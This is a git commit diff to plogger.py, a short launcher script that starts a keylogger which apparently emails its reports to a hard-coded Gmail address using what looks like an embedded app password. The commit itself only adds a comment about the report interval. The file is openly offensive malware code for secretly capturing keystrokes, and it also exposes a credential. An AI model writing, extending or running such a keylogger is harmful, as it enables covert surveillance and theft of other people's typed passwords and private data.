1d5026f66f95a703216e3ffbe3e942a717b5bc4a
ThikaHok <118625084+ThikaHok@users.noreply.github.com>
2022-11-30 22:48:20 +0700

    Update plogger.py

--- plogger.py
+++ plogger.py
@@ -3,4 +3,5 @@
 import key_logger
 
 my_keylogger = key_logger .Keylogger(60, "cyberfake.project@gmail.com", "isolxzascgjftzeb")
+#Can set how long to make one report in the number attribute above, 1 = 1 second
 my_keylogger.start()
